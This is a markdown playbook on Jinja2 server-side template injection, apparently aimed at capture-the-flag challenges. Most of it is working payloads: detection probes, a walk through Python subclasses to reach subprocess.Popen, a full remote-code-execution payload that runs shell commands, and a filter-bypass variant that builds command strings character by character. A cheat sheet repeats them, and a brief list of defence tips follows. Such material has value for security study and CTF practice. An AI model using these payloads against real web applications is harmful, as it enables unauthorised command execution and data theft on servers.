
# SSTI Exploitation Playbook (Jinja2 Focused)

## 📌 What is SSTI?  
**Server‑Side Template Injection** occurs when user input is rendered unsafely in a server‑side template, allowing attackers to inject code that the template engine evaluates — potentially leading to **Remote Code Execution (RCE)**.

---

## 🧭 Step-by‑Step Guide

### 1. Identify Template Evaluation  
Test simple payloads in any form field or URL parameter:

```jinja
{{ 7*7 }}
Expected output: 49
```
If you see 49, the engine (e.g. Jinja2, Twig) is evaluating your input.

Try also:

````jinja
{{ config }}    ← Flask app config object  
{{ request }}   ← Flask request object  
{{ self }}      ← Template object  
````

###  2. Explore Objects and Classes
Dump all subclasses of Python’s base object:

````jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
'' → empty string

__class__ → <class 'str'>

__mro__[1] → <class 'object'>

__subclasses__() → list of every loaded class
````

### 3. Find subprocess.Popen
Brute‑force the index until you see:

````jinja
{{ ''.__class__.__mro__[1].__subclasses__()[<i>] }}
````
Try i from 300 to 400. When you get:
````javascript
<class 'subprocess.Popen'>
````
✅ You’ve found it (e.g. index 356).

### 4. Achieve RCE
Substitute your index (356 in this example) into:

````jinja
{{ ''.__class__.__mro__[1].__subclasses__()[356](
     "id", shell=True, stdout=-1
   ).communicate()[0] }}
   ````
Test: Replace "id" with any command.

List files: "ls" or "ls /"

Read flag: "cat flag" or "cat flag.txt"

### 5. Bypass Filters (Optional)
If keywords are black‑listed, build the command string dynamically:

````jinja
{{ ''.__class__.__mro__[1].__subclasses__()[356](
     ''.join(['c','a','t',' ','f','l','a','g']), 
     shell=True, stdout=-1
   ).communicate()[0] }}
   ````
🛑 Defense Tips
Sanitize user input before rendering.

Never pass user data directly into templates.

Disable template debugging in production (DEBUG=False).

Use sandboxed or safer templating engines where possible.


## 🧪 Quick Cheatsheet

| Action             | Payload                                                                                       |
|--------------------|-----------------------------------------------------------------------------------------------|
| Test execution     | ``{{ 7*7 }}`` → `49`                                                                          |
| Dump subclasses    | ``{{ ''.__class__.__mro__[1].__subclasses__() }}``                                           |
| Show one subclass  | ``{{ ''.__class__.__mro__[1].__subclasses__()[i] }}``                                        |
| Run a command      | ``{{ cls("id", shell=True, stdout=-1).communicate()[0] }}``                                   |
| Read the flag      | ``{{ cls("cat flag", shell=True, stdout=-1).communicate()[0] }}``                             |
| Obfuscate command  | ``{{ cls(''.join(['c','a','t',' ','f','l','a','g']), shell=True, stdout=-1).communicate()[0] }}`` |


Replace cls with the full chain:

````jinja
''.__class__.__mro__[1].__subclasses__()[356]
````

## ✅ TL;DR: Fast Flow

1. **Test:** ``{{ 7*7 }}`` → `49`  
2. **Recon:** ``{{ config }}``, ``{{ request }}``, ``{{ self }}``  
3. **Brute:** find `Popen` in ``subclasses()[i]``  
4. **Exploit:** RCE via `.communicate()`  
5. **Flag:** `cat flag.txt`  
